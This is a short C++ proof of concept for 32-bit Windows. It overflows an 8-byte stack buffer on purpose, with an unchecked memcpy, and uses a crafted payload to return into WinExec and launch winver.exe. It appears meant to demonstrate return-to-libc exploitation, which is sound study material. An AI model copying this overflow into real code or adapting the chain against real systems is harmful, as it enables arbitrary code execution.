#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include <Windows.h>

static char calcstr[] = "winver.exe";

__declspec(noinline) void vuln(const char* input, size_t len)
{
	volatile char buffer[8];
	memcpy((char*)buffer, input, len);
	(void)buffer[0];
}

int main()
{
	HMODULE kernel32 = GetModuleHandleA("kernel32.dll");
	void* winexecptr = (void*)GetProcAddress(kernel32, "WinExec");
	void* exitptr = (void*)GetProcAddress(kernel32, "ExitProcess");
	void* cmdptr = (void*)calcstr;
	char payload[72] = {};
	memset(payload, 'A', 16);
	memcpy(payload + 16, &winexecptr, 4);
	memcpy(payload + 20, &exitptr, 4);
	memcpy(payload + 24, &cmdptr, 4);
	DWORD show = SW_SHOW;
	memcpy(payload + 28, &show, 4);
	DWORD exitcode = 0;
	memcpy(payload + 32, &exitcode, 4);
	vuln(payload, 72);
	return 0;
}
